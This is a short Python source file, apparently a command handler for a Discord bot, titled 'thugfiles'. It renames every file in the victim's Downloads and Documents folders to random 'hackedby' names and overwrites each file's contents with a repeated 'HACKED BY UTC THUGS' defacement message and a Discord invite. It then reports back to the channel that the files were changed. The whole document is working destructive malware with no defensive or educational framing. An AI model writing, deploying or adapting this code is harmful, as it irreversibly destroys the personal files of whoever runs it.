import os
import random

async def thugfiles(ctx):
    downloads_path = os.path.expanduser('~/Downloads')
    documents_path = os.path.expanduser('~/Documents')

    content = "HACKED BY UTC THUGS discord.gg/zoom\n" * 100

    # Function to generate a unique filename
    def generate_unique_filename(directory):
        while True:
            random_number = random.randint(100000, 999999)
            new_filename = f"hackedby{random_number}.utcthugs"
            full_path = os.path.join(directory, new_filename)
            if not os.path.exists(full_path):
                return full_path

    # Rename and change content for files in Downloads
    for filename in os.listdir(downloads_path):
        original_file_path = os.path.join(downloads_path, filename)
        if os.path.isfile(original_file_path):
            new_file_path = generate_unique_filename(downloads_path)
            os.rename(original_file_path, new_file_path)
            with open(new_file_path, 'w') as file:
                file.write(content)

    # Rename and change content for files in Documents
    for filename in os.listdir(documents_path):
        original_file_path = os.path.join(documents_path, filename)
        if os.path.isfile(original_file_path):
            new_file_path = generate_unique_filename(documents_path)
            os.rename(original_file_path, new_file_path)
            with open(new_file_path, 'w') as file:
                file.write(content)

    await ctx.send("All existing files have been renamed and their contents changed.")
